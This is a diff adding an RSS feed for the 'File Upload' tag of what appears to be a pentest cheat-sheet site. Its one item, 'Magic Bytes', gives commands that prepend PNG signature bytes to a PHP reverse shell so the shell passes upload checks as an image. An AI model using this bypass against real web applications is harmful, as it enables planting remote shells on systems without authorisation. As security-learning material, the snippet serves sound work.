@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>File Upload on TLDRBins</title>
+    <link>https://tldrbins.github.io/@file-upload/</link>
+    <description>Recent content in File Upload on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@file-upload/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Magic Bytes</title>
+      <link>https://tldrbins.github.io/magic_bytes/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/magic_bytes/</guid>
+      <description> png echo &amp;#39;89 50 4E 47 0D 0A 1A 0A&amp;#39; | xxd -p -r &amp;gt;&amp;gt; php-reverse-shell.php.png cat php-reverse-shell.php &amp;gt;&amp;gt; php-reverse-shell.php.png </description>
+    </item>
+  </channel>
+</rss>
